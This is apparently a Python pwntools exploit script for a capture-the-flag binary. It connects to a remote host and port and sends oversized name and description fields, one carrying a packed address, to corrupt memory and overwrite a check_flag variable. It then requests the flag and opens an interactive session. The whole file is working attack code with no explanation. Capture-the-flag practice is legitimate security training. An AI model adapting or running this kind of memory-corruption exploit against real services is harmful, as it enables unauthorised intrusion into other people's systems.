from pwn import *

def Create(sex,name,age,des,id=0):
	r.sendline('1')
	r.recvuntil('> ')
	r.sendline(str(sex))
	r.recvuntil("Name: ")
	r.send(name)
	r.recvuntil("Age: ")
	r.sendline(str(age))
	r.recvuntil("Description: ")
	r.send(des)
	if id != 0:
		r.recvuntil("> ")
		r.sendline(str(id))
	r.recvuntil("> ")
	
def get_flag():
	r.sendline('5')
	r.recvuntil("> ")
	r.sendline('1')
	r.recvuntil("> ")
	r.sendline('1')
	print r.recvuntil("> ")
	
#r = process("./bmhh")
r = remote("125.235.240.168", 17357)
check_flag = 0x603440
raw_input("?")
print r.recvuntil("> ")
Create(2,'a'*49,10,'A'*0x10e+p64(check_flag-0x238))
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(2,'a'*49,10,'A'*0x1ff)
Create(1,'a'*49,10,'B'*0xff)
r.sendline(str(1))
Create(1,'a'*49,10,'B'*0xff,1)
get_flag()
r.interactive()